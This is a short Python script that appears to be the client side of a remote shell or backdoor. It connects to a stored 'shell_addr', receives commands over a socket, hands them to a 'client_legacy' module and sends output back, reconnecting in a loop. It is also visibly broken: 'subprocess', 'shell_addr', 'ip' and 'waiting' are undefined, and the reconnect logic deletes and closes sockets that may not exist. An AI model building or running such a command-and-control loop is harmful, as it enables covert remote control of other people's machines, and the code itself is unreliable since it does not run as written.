from legend import client_legacy
import socket, time

s = socket.socket(2, 1)
s.bind(('', 9099))
s.listen(5)
client, addr = s.accept()
print("Gotcha")
del s
time.sleep(10)

# s = waiting(creds=shell_addr)
s = None
while s == None or s.fileno() == -1:
    try:
        del s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(shell_addr)
    except ConnectionRefusedError:
        s.close()
        
        
while True:
    com = s.recv(1024).decode('cp65001')
    try:
        client_legacy.MAIN(command=com, s=s, ip=ip)
        s.send(subprocess.getoutput('cd').encode('cp65001'))
    except:
        s.close()
        s = waiting(creds=shell_addr)
